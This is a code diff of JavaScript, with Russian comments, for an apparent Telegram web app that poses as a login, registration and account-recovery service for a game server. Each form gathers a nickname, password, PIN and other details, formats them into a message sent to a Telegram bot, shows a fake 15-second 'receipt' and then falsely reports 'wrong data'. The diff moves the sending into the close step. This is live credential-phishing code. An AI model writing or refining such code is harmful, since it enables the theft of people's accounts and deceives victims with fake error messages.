@@ -24,19 +24,12 @@ if (loader && main) {
     }, 30);
 }
 
-// ПАРОЛЬ: только буквы и цифры
-function onlyLetters(input) {
-    input.value = input.value.replace(/[^A-Za-z0-9]/g, '');
-}
+// ФИЛЬТРЫ ВВОДА
+function onlyLetters(input) { input.value = input.value.replace(/[^A-Za-z0-9]/g, ''); }
+function onlyEnglish(input) { input.value = input.value.replace(/[^A-Za-z0-9_]/g, ''); }
+function onlyPin(input) { input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4); }
 
-function onlyEnglish(input) {
-    input.value = input.value.replace(/[^A-Za-z0-9_]/g, '');
-}
-
-function onlyPin(input) {
-    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4);
-}
-
+// ПРОВЕРКА НИКА (не тронута)
 function checkNick() {
     const nick = document.getElementById('nick');
     const icon = document.getElementById('iconNick');
@@ -46,12 +39,24 @@ function checkNick() {
     else { icon.classList.remove('green'); icon.classList.add('red'); }
 }
 
+// ПРОВЕРКА ПАРОЛЯ (для входа и регистрации)
 function checkPassword() {
     const pass = document.getElementById('password') || document.getElementById('new_password');
     const icon = document.getElementById('iconPass') || document.getElementById('iconNewPass');
     if (!pass || !icon) return;
     
-    // Минимум 7 символов, только буквы и цифры
+    // От 7 символов, буквы и цифры
+    const valid = /^[A-Za-z0-9]{7,}$/.test(pass.value);
+    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
+    else { icon.classList.remove('green'); icon.classList.add('red'); }
+}
+
+// ПРОВЕРКА СТАРОГО ПАРОЛЯ (для восстановления)
+function checkOldPassword() {
+    const pass = document.getElementById('old_password');
+    const icon = document.getElementById('iconOldPass');
+    if (!pass || !icon) return;
+    
     const valid = /^[A-Za-z0-9]{7,}$/.test(pass.value);
     if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
     else { icon.classList.remove('green'); icon.classList.add('red'); }
@@ -90,7 +95,11 @@ function selectServer(value) {
     toggleServerList();
 }
 
-// ОТПРАВКА ПРИ НАЖАТИИ (без закрытия)
+function goTo(page) { window.location.href = page; }
+
+// ==========================================
+// ЧЕК: 15 СЕК + 1.1 СЕК + АВТООТПРАВКА
+// ==========================================
 let pendingData = null;
 
 function sendToBot(text) {
@@ -106,7 +115,9 @@ function closeReceipt() {
     tg.close();
 }
 
-function showReceipt(nick, server, type) {
+function showReceipt(nick, server, type, dataText) {
+    pendingData = dataText;
+
     const now = new Date();
     const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
     const ticket = Math.floor(1000000 + Math.random() * 9000000);
@@ -144,22 +155,33 @@ function showReceipt(nick, server, type) {
     const bar = document.getElementById('receiptBar');
     const statusText = document.getElementById('statusText');
 
+    // 100 шагов по 150 мс = ровно 15 секунд
     const interval = setInterval(() => {
         counter += 1;
         if (counter >= 100) {
             counter = 100;
             clearInterval(interval);
+            
+            // Меняем текст на красный (ошибка)
             if (statusText) {
                 statusText.textContent = 'Вы ввели неверные данные';
                 statusText.style.color = '#6a0000';
                 statusText.style.fontWeight = '700';
             }
+
+            // Ждем 1.1 секунды и отправляем данные
+            setTimeout(() => {
+                closeReceipt();
+            }, 1100);
+
         }
         if (bar) bar.style.width = counter + '%';
     }, 150);
 }
 
-function goTo(page) { window.location.href = page; }
+// ==========================================
+// ФУНКЦИИ КНОПОК
+// ==========================================
 
 function login() {
     const nick = document.getElementById('nick').value.trim();
@@ -170,8 +192,7 @@ function login() {
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
     if (!validatePassword(password)) { alert('Пароль: от 7 символов (буквы и цифры)!'); return; }
     const data = `🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
-    sendToBot(data);
-    showReceipt(nick, server, 'Вход в аккаунт');
+    showReceipt(nick, server, 'Вход в аккаунт', data);
 }
 
 function register() {
@@ -185,8 +206,7 @@ function register() {
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
     if (!validatePassword(password)) { alert('Пароль: от 7 символов (буквы и цифры)!'); return; }
     const data = `📝 РЕГИСТРАЦИЯ АККАУНТА\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n📧 Почта: ${email || 'нет'}\n🌍 Сервер: ${server}\n👥 Пригласил: ${referrer || 'нет'}`;
-    sendToBot(data);
-    showReceipt(nick, server, 'Создание аккаунта');
+    showReceipt(nick, server, 'Создание аккаунта', data);
 }
 
 function recover() {
@@ -200,6 +220,5 @@ function recover() {
     if (!oldPass) { alert('Введите старый пароль!'); return; }
     if (!validatePassword(newPass)) { alert('Новый пароль: от 7 символов (буквы и цифры)!'); return; }
     const data = `🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
-    sendToBot(data);
-    showReceipt(nick, server, 'Восстановление аккаунта');
+    showReceipt(nick, server, 'Восстановление аккаунта', data);
 }
